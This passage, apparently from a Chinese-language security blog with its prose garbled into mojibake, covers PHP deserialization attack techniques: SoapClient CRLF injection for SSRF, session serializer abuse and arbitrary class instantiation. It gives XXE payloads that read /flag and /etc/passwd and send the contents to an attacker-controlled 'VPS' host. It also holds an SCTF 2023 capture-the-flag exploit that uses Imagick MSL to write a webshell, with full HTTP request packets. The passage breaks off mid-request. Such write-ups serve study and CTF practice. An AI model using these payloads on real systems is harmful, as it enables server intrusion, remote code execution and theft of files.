function">serialize</span><span class="token punctuation">(</span><span class="token variable">$attack</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token string">"not_exists_function"</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>CRLFå°±æ˜¯<code>\r\n</code>åœ¨HTTPæŠ¥æ–‡ä¸­å½“æ¢è¡Œç”¨ã€‚user-agentæ³¨å…¥CookieæˆåŠŸã€‚</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1676533896472.png" style="zoom:80%;" /><h5 id="CRLFæ³¨å…¥ä»»æ„POSTæ•°æ®"><a href="#CRLFæ³¨å…¥ä»»æ„POSTæ•°æ®" class="headerlink" title="CRLFæ³¨å…¥ä»»æ„POSTæ•°æ®"></a>CRLFæ³¨å…¥ä»»æ„POSTæ•°æ®</h5><p>Content-Typeä¸æ˜¯å¯æ§çš„ï¼Œä½†å¯ä»¥é€šè¿‡User-Agentä¼ªé€ ContentTypeå®ç°ä»»æ„POSTè¯·æ±‚ã€‚</p><p>æ³¨ï¼šContent-Lengthä¹Ÿéœ€è¦æ³¨å…¥ã€‚</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$target</span> <span class="token operator">=</span> 'http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//127.0.0.1:5555/path';</span><span class="token variable">$post_string</span> <span class="token operator">=</span> <span class="token string">'data=something'</span><span class="token punctuation">;</span><span class="token variable">$headers</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>    <span class="token string">'X-Forwarded-For: 127.0.0.1'</span><span class="token punctuation">,</span>    <span class="token string">'Cookie: PHPSESSID=123456'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'location'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$target</span><span class="token punctuation">,</span><span class="token string">'user_agent'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'Squirt1e^^Content-Type: application/x-www-form-urlencoded^^'</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">'^^'</span><span class="token punctuation">,</span><span class="token variable">$headers</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'^^Content-Length: '</span><span class="token punctuation">.</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$post_string</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'^^^^'</span><span class="token punctuation">.</span><span class="token variable">$post_string</span><span class="token punctuation">,</span><span class="token string">'uri'</span>      <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"aaab"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'^^'</span><span class="token punctuation">,</span><span class="token string">"\r\n"</span><span class="token punctuation">,</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$aaa</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">not_exists_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="php-session"><a href="#php-session" class="headerlink" title="php session"></a>php session</h4><p>æ„é€ å™¨çš„å·®å¼‚é€ æˆçš„ååºåˆ—åŒ–ã€‚</p><ul><li>ini_set(â€˜session.serialize_handlerâ€™,â€™php_serializeâ€™);</li><li>ini_set(â€˜session.serialize_handlerâ€™,â€™phpâ€™);</li></ul><p>åƒè¿™ç§å°±å¯æ§ã€‚</p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'baby'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'d0g3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//$a=session_start  POST: serialize_handler=pphp_serialize</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯¹äºphp_serializeæ„é€ å™¨ï¼Œåºåˆ—åŒ–æ•°æ®å‰é¢è¦åŠ ä¸ªâ€™|â€™ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1676535834714.png"></p><p>ç„¶åä½¿ç”¨phpæ„é€ å™¨å°±èƒ½ååºåˆ—åŒ–äº†ï¼Œå› ä¸ºphpæ„é€ å™¨åˆ†å‰²é”®ä¸ºâ€™|â€™ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1676535938182.png"></p><h3 id="å¯å®ä¾‹åŒ–ç±»new-class-argv"><a href="#å¯å®ä¾‹åŒ–ç±»new-class-argv" class="headerlink" title="å¯å®ä¾‹åŒ–ç±»new $class($argv);"></a>å¯å®ä¾‹åŒ–ç±»new $class($argv);</h3><p>å¦‚æœä»…ä»…æ˜¯å¯å®ä¾‹åŒ–ä»»æ„ç±»ï¼Œå¹¶ä¸”èƒ½æ¥å—å‚æ•°ï¼Œé‚£ä¹ˆæ­¤æ—¶è¯¥å¦‚ä½•åˆ©ç”¨å‘¢ï¼Ÿå…¶å®æ— éå°±æ˜¯æ‰¾è‡ªå®šä¹‰ç±»ã€å†…ç½®ç±»æˆ–è€…æ‰©å±•ç±»ã€‚</p><h4 id="è‡ªå®šä¹‰ç±»"><a href="#è‡ªå®šä¹‰ç±»" class="headerlink" title="è‡ªå®šä¹‰ç±»"></a>è‡ªå®šä¹‰ç±»</h4><p>å®ä¾‹åŒ–ç±»æ—¶ä¼šè§¦å‘æ„é€ å‡½æ•°ï¼Œé‚£ä¹ˆå°±ä¼šè§¦å‘é‡Œé¢çš„ä»£ç ã€‚å¦‚æœ<code>xxx</code>ä¸ºå¯ä»¥åˆ©ç”¨çš„å‡½æ•°ï¼Œé‚£ä¹ˆè‡ªç„¶å¯ä»¥æ”»å‡»ã€‚</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Evil</span> <span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function">__construct</span> <span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// xxx</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">new</span> <span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸€èˆ¬ä¸ä¼šå‡ºç°è¿™æ ·çš„æƒ…å†µï¼Œå³ä¾¿ç›®æ ‡æœåŠ¡ä¸­æœ‰è¿™æ ·çš„æ¶æ„ç±»ï¼Œä½†å¯èƒ½ç”±äºæ²¡æœ‰<code>include</code>è€Œæ— æ³•è°ƒç”¨ã€‚</p><p>é€šè¿‡<code>php</code>ä¸­çš„è‡ªåŠ¨åŠ è½½å‡½æ•°å¯ä»¥æ‰¾åˆ°å…¨å±€è‡ªå®šä¹‰çš„ç±»ã€‚å› æ­¤åˆ©ç”¨é¢å°±ä»å•ä¸ªæ–‡ä»¶æ‰©å±•åˆ°æ•´ä¸ªé¡¹ç›®ï¼Œå‰ææ˜¯æœ‰æ³¨å†Œå›è°ƒ<code>spl_autoload_register</code>æˆ–å®šä¹‰æ¥è®¾ç½®çš„<code>__autoload</code>ã€‚</p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">spl_autoload_register</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$class_name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">include</span> <span class="token string">'./../classes/'</span> <span class="token punctuation">.</span> <span class="token variable">$class_name</span> <span class="token punctuation">.</span> <span class="token string">'.php'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">__autoload</span><span class="token punctuation">(</span><span class="token variable">$class_name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">include</span> <span class="token variable">$class_name</span> <span class="token punctuation">.</span> <span class="token string">'.php'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token function">spl_autoload_register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="å†…ç½®ç±»"><a href="#å†…ç½®ç±»" class="headerlink" title="å†…ç½®ç±»"></a>å†…ç½®ç±»</h4><p>å†…ç½®ç±»å¾ˆå¤šï¼Œä½†å¦‚æœåªèƒ½ä¼ é€’ä¸€ä¸ªå‚æ•°å¹¶ä¸”ä¸å¯¹åˆ›å»ºçš„å¯¹è±¡è¿›è¡Œæ–¹æ³•è°ƒç”¨ï¼Œé‚£ä¹ˆå°±å¾ˆéš¾æ‰¾åˆ°åˆé€‚çš„å†…ç½®ç±»äº†ã€‚</p><h5 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a>SplFileObject</h5><p><code>SplFileObject</code>å®ç°äº†ä¸€ä¸ªå…è®¸è¿æ¥åˆ°ä»»ä½•æœ¬åœ°æˆ–è¿œç¨‹ URL çš„æ„é€ å‡½æ•°ã€‚å¯ä»¥é€šè¿‡è¯¥ç±»å®ç°SSRFã€‚</p><p><code>PHP &lt; 8</code> ä¸­çš„ <code>SSRF</code> å¯ä»¥é€šè¿‡ <code>Phar</code> åè®®æŠ€æœ¯è½¬åŒ–ä¸ºååºåˆ—åŒ–ã€‚</p><p>å› æ­¤ï¼Œæ»¡è¶³ä»¥ä¸‹æ¡ä»¶å³å¯ï¼š</p><ol><li>å¯ä¸Šä¼ æ–‡ä»¶ï¼Œä¸”è·¯å¾„å·²çŸ¥ã€‚</li><li>å­˜åœ¨<code>pop</code>é“¾</li></ol><h5 id="SimpleXMLElement"><a href="#SimpleXMLElement" class="headerlink" title="SimpleXMLElement"></a>SimpleXMLElement</h5><p>è¯¥ç±»æ¥æ”¶<code>3</code>ä¸ªå‚æ•°ã€‚</p><p>é€šè¿‡è®¾ç½®ç¬¬ä¸‰ä¸ªå‚æ•°<code>dataIsURL</code>ä¸º<code> true</code>å¯ä»¥å®ç°è¿œç¨‹<code>xml</code>æ–‡ä»¶çš„åŠ è½½ã€‚ç¬¬äºŒä¸ªå‚æ•°çš„å¸¸é‡å€¼è®¾ç½®ä¸º<code>2</code>å³å¯ã€‚ç¬¬ä¸€ä¸ªå‚æ•° <code>data</code> ç”¨äºå¼•å…¥çš„å¤–éƒ¨å®ä½“çš„<code>url</code>ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡å®ƒæ‰“ä¸ªXXEã€‚</p><p><strong>evil.xml</strong></p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token doctype">&lt;!DOCTYPE try[&lt;!ENTITY % remote SYSTEM "https://VPS/send.xml"></span>%remote;%all;%send;]><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>send.xml</strong></p><pre class="line-numbers language-xml"><code class="language-xml">&lt;!ENTITY % payload SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">&lt;!ENTITY % all "&lt;!ENTITY <span class="token entity" title="&#37;">&amp;#37;</span> send SYSTEM 'https://VPS/?%payload;'>"><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ä¹Ÿå¯ä»¥ç›´æ¥è¯»æ–‡ä»¶ï¼Œå°±ä¸éœ€è¦ç¬¬ä¸‰ä¸ªå‚æ•°äº†ã€‚</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version=\"1.0\"?></span><span class="token doctype">&lt;!DOCTYPE ANY [&lt;!ENTITY f SYSTEM \"file:///etc/passwd\"></span>]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x</span><span class="token punctuation">></span></span><span class="token entity" title="&f;">&amp;f;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="æ‰©å±•ç±»"><a href="#æ‰©å±•ç±»" class="headerlink" title="æ‰©å±•ç±»"></a>æ‰©å±•ç±»</h4><h5 id="Magick"><a href="#Magick" class="headerlink" title="Magick"></a>Magick</h5><p><code>Imagick</code>æ‹“å±•ç±»æ˜¯ç”¨äºå¤„ç†å›¾åƒçš„ï¼Œå®ƒæ˜¯é€šè¿‡<code>Magick Scripting Language</code>è¯­æ³•æ¥å¤„ç†çš„ã€‚</p><p>è¿™ä¸ªè¯­æ³•å¯ä»¥ç”¨æ¥å†™ã€è½¬ç§»æ–‡ä»¶ï¼Œéš¾ç‚¹åœ¨äºå®ƒåªæ”¯æŒå›¾ç‰‡æ ¼å¼ï¼Œå¦‚æœä¸æ˜¯å®ƒæ”¯æŒçš„å›¾ç‰‡æ ¼å¼çš„è¯å°±æŠ¥é”™ã€‚</p><p>é€šè¿‡æ£€ç´¢å¯çŸ¥åˆ©ç”¨<code>ppm</code>å›¾åƒæ–‡ä»¶æ ¼å¼çš„ç‰¹ç‚¹ï¼Œå¯åœ¨æœ«å°¾æ’å…¥åºåˆ—åŒ–æ•°æ®è€Œä¸å½±å“å›¾ç‰‡çš„æ­£å¸¸è§£æï¼Œè¿™ä¸ªä¸œè¥¿å°±å¾ˆå¦™ã€‚</p><p>ä¾‹å¦‚<code>SCTF 2023</code>çš„<code>fumo_backdoor</code>ã€‚</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'open_basedir'</span><span class="token punctuation">,</span> <span class="token constant">__DIR__</span><span class="token punctuation">.</span><span class="token string">":/tmp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string">"FUNC_LIST"</span><span class="token punctuation">,</span> <span class="token function">get_defined_functions</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">fumo_backdoor</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$argv</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$class</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>            <span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">path</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>             <span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">'/[flag]/m'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">path</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span>        <span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">func</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>            <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>             <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token constant">FUNC_LIST</span><span class="token punctuation">[</span><span class="token string">"internal"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$argv</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">argv</span><span class="token punctuation">;</span>            <span class="token variable">$class</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">class</span><span class="token punctuation">;</span>                        <span class="token keyword">new</span> <span class="token variable">$class</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">case</span> <span class="token string">'unserialze'</span><span class="token punctuation">:</span>        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'rm'</span><span class="token punctuation">:</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"rm -rf /tmp 2>/dev/null"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">default</span><span class="token punctuation">:</span>        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œå¦‚æœ<code>web</code>ç›®å½•å¯å†™ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å†™é©¬ã€‚</p><p>é€šè¿‡<code>vid</code>æ¨¡å¼ï¼Œæˆ‘ä»¬å¯ä»¥åŒ…å«æœªçŸ¥åç§°çš„<code>MSL</code>æ ¼å¼çš„ä¸´æ—¶æ–‡ä»¶ï¼Œä»è€Œè§¦å‘<code>MSL</code>è¯­æ³•è¾¾åˆ°å†™çš„ç›®çš„ã€‚</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$webshell</span> <span class="token operator">=</span> <span class="token string">"&lt;?php system('ls');?>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string">"P6\n9 9\n255\n"</span> <span class="token punctuation">.</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string">"A"</span><span class="token punctuation">,</span> <span class="token number">9</span> <span class="token operator">*</span> <span class="token number">9</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">-</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$webshell</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token variable">$webshell</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>æ•°æ®åŒ…</strong></p><pre class="line-numbers language-http"><code class="language-http">POST /?cmd=unserialze&amp;data=O%3A13%3A%22fumo_backdoor%22%3A4%3A%7Bs%3A4%3A%22path%22%3BN%3Bs%3A4%3A%22argv%22%3Bs%3A17%3A%22vid%3Amsl%3A%2Ftmp%2Fphp%2A%22%3Bs%3A4%3A%22func%22%3BN%3Bs%3A5%3A%22class%22%3Bs%3A7%3A%22Imagick%22%3B%7D HTTP/1.1<span class="token header-name keyword">Host:</span> 127.0.0.1:18080<span class="token header-name keyword">Cache-Control:</span> max-age=0<span class="token header-name keyword">Content-Length:</span> 710<span class="token header-name keyword">Content-Type:</span> multipart/form-data; boundary=------------------------c32aaddf3d8fd979--------------------------c32aaddf3d8fd979<span class="token header-name keyword">Content-Disposition:</span> form-data; name="whatever"; filename="whatever"<span class="token header-name keyword">Content-Type:</span> application/octet-stream&lt;?xml version="1.0" encoding="UTF-8"?>&lt;image> &lt;read filename="inline:data://image/x-portable-anymap;base64,UDYKOSA5CjI1NQpBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUE8P3BocCBzeXN0ZW0oJ2xzJyk7Pz4=" /> &lt;write filename="/var/www/html/b.php" />&lt;/image>--------------------------c32aaddf3d8fd979--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>RCE</code></p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1687795236160.png" alt="1687795236160"></p><p>å½“ç„¶ï¼Œä¸€èˆ¬æƒ…å†µä¸‹<code>web</code>ç›®å½•æ²¡æ³•å†™ï¼Œè¿™é¢˜ä¹Ÿæ˜¯ï¼Œåªä¸è¿‡ä¸ºäº†æµ‹è¯•æ”¹äº†æƒé™ã€‚</p><p>æ­¤é¢˜çš„æ­£ç¡®è§£æ³•æ˜¯æƒ³åŠæ³•è§¦å‘<code>__sleep</code>ä»è€ŒæŠŠ<code>flag</code>è¯»å‡ºæ¥ã€‚</p><p>è¦è§¦å‘<code>__sleep</code>å¿…é¡»è¦åºåˆ—åŒ–ï¼Œå› æ­¤è¯¥é¢˜åªèƒ½æä¸ª<code>session</code>åºåˆ—åŒ–ä»è€Œè§¦å‘<code>__sleep</code>äº†ã€‚</p><p>è€Œ<code>php</code>çš„<code>session</code>æ˜¯åœ¨<code>tmp</code>ç›®å½•ä¸‹å­˜æ”¾çš„ï¼Œè¯¥ç›®å½•ä¸€èˆ¬éƒ½å¯å†™ï¼Œå¹¶ä¸”åç§°æ˜¯å¯æ§çš„ã€‚</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">fumo_backdoor</span>           <span class="token comment" spellcheck="true">//ç”Ÿæˆppmæ ¼å¼çš„sessionå†…å®¹</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token variable">$argv</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$class</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$fumo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">fumo_backdoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$fumo</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">path</span> <span class="token operator">=</span> <span class="token string">"/tmp/squirt1e"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//readfileè¯»å–çš„æ–‡ä»¶ï¼Œæ­¤æ—¶æ˜¯ç©ºçš„ã€‚</span><span class="token variable">$serialized</span> <span class="token operator">=</span> <span class="token string">"|"</span> <span class="token punctuation">.</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$fumo</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string">"P6\n9 9\n255\n"</span> <span class="token punctuation">.</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string">"A"</span><span class="token punctuation">,</span> <span class="token number">9</span> <span class="token operator">*</span> <span class="token number">9</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">-</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$serialized</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token variable">$serialized</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>æ•°æ®åŒ…</strong></p><pre class="line-numbers language-http"><code class="language-http">POST 